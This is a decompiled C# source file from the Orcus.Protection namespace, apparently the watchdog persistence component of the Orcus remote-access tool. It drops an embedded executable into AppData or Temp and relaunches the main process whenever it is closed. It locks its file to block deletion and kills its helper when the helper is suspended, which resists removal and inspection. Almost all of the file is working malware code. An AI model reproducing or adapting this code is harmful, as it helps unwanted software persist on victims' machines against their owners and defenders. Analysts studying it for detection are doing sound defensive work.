using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Threading;
using Microsoft.Win32;
using Orcus.Config;
using Orcus.Properties;
using Orcus.Shared.Settings;
using Orcus.Shared.Utilities;
using Orcus.Utilities;

namespace Orcus.Protection;

public static class Watchdog
{
	private static int _processId;

	private static Process _watchdogProcess;

	public static bool IsEnabled { get; private set; }

	public static void Close()
	{
		if (IsEnabled)
		{
			IsEnabled = false;
			try
			{
				_watchdogProcess?.Kill();
			}
			catch (Exception)
			{
			}
			_watchdogProcess = null;
		}
	}

	public static void Initizalize()
	{
		//IL_0075: Unknown result type (might be due to invalid IL or missing references)
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0080: Expected O, but got Unknown
		if (IsEnabled)
		{
			return;
		}
		IsEnabled = true;
		List<string> list = Environment.GetCommandLineArgs().ToList();
		if (list.Contains("/keepAlive"))
		{
			int.TryParse(list[list.IndexOf("/keepAlive") + 1], out _processId);
		}
		Thread thread = new Thread(KeepAlive);
		thread.IsBackground = true;
		thread.Start();
		object obj = _003C_003Ec._003C_003E9__7_0;
		if (obj == null)
		{
			SessionEndingEventHandler val = delegate
			{
				Close();
			};
			obj = (object)val;
			_003C_003Ec._003C_003E9__7_0 = val;
		}
		SystemEvents.add_SessionEnding((SessionEndingEventHandler)obj);
	}

	private static void KeepAlive()
	{
		bool flag = false;
		FileStream fileStream = null;
		FileInfo fileInfo = null;
		try
		{
			int id = Process.GetCurrentProcess().Id;
			WaitHandle[] array = new WaitHandle[2]
			{
				new ManualResetEvent(initialState: false),
				new ManualResetEvent(initialState: false)
			};
			WaitCallback callBack = delegate(object state)
			{
				ManualResetEvent manualResetEvent2 = (ManualResetEvent)state;
				try
				{
					_watchdogProcess.WaitForExit();
				}
				catch (Exception)
				{
				}
				manualResetEvent2.Set();
			};
			WaitCallback callBack2 = delegate(object state)
			{
				ManualResetEvent manualResetEvent = (ManualResetEvent)state;
				try
				{
					if (!WaitForSuspension(_watchdogProcess))
					{
						return;
					}
					_watchdogProcess.Kill();
				}
				catch (Exception)
				{
				}
				manualResetEvent.Set();
			};
			while (IsEnabled)
			{
				string path;
				if (_processId == 0)
				{
					if (fileInfo == null || !fileInfo.Exists)
					{
						fileInfo = WriteWatchdogFile();
					}
					if (fileInfo == null)
					{
						return;
					}
					Process process = Process.Start(fileInfo.FullName, string.Format("/launchSelfAndExit \"{0}\" {1}{2}", Assembly.GetEntryAssembly()!.Location, id, Orcus.Config.Settings.GetBuilderProperty<WatchdogBuilderProperty>().get_PreventFileDeletion() ? " /protectFile" : ""));
					if (process == null)
					{
						return;
					}
					process.WaitForExit();
					_watchdogProcess = Process.GetProcessById(process.ExitCode);
					path = fileInfo.FullName;
				}
				else
				{
					try
					{
						_watchdogProcess = Process.GetProcessById(_processId);
					}
					catch (Exception)
					{
						continue;
					}
					finally
					{
						_processId = 0;
					}
					path = _watchdogProcess.MainModule!.FileName;
				}
				if (Orcus.Config.Settings.GetBuilderProperty<WatchdogBuilderProperty>().get_PreventFileDeletion())
				{
					fileStream = new FileStream(path, FileMode.Open, FileAccess.Read, FileShare.Read);
				}
				for (int i = 0; i < array.Length; i++)
				{
					((ManualResetEvent)array[i]).Reset();
				}
				ThreadPool.QueueUserWorkItem(callBack, array[0]);
				ThreadPool.QueueUserWorkItem(callBack2, array[1]);
				WaitHandle.WaitAny(array);
			}
		}
		catch (Exception)
		{
			flag = true;
		}
		finally
		{
			Close();
			fileStream?.Dispose();
		}
		if (flag)
		{
			Initizalize();
		}
	}

	private static bool WaitForSuspension(Process process)
	{
		while (!process.HasExited)
		{
			process.Refresh();
			foreach (ProcessThread thread in process.Threads)
			{
				if (thread.ThreadState == System.Diagnostics.ThreadState.Wait && thread.WaitReason == ThreadWaitReason.Suspended)
				{
					return true;
				}
			}
			Thread.Sleep(500);
		}
		return false;
	}

	private static FileInfo WriteWatchdogFile()
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Invalid comparison between Unknown and I4
		WatchdogBuilderProperty builderProperty = Orcus.Config.Settings.GetBuilderProperty<WatchdogBuilderProperty>();
		WatchdogLocation watchdogLocation = builderProperty.get_WatchdogLocation();
		string path;
		if ((int)watchdogLocation != 0)
		{
			if ((int)watchdogLocation != 1)
			{
				return null;
			}
			path = Path.GetTempPath();
		}
		else
		{
			path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		}
		FileInfo fileInfo = new FileInfo(Path.Combine(path, builderProperty.get_Name()));
		if (fileInfo.Exists)
		{
			for (int i = 0; i < 5; i++)
			{
				try
				{
					fileInfo.Delete();
				}
				catch (Exception)
				{
					continue;
				}
				Thread.Sleep(50);
			}
			if (fileInfo.Exists)
			{
				fileInfo = new FileInfo(FileExtensions.MakeUnique(fileInfo.FullName));
			}
		}
		try
		{
			ResourceHelper.WriteGZippedResourceToFile(fileInfo.FullName, "Orcus.Watchdog.exe.gz");
		}
		catch (Exception)
		{
			return null;
		}
		File.WriteAllText(fileInfo.FullName + ".config", Resources.AppConfig);
		fileInfo.Refresh();
		return fileInfo;
	}
}
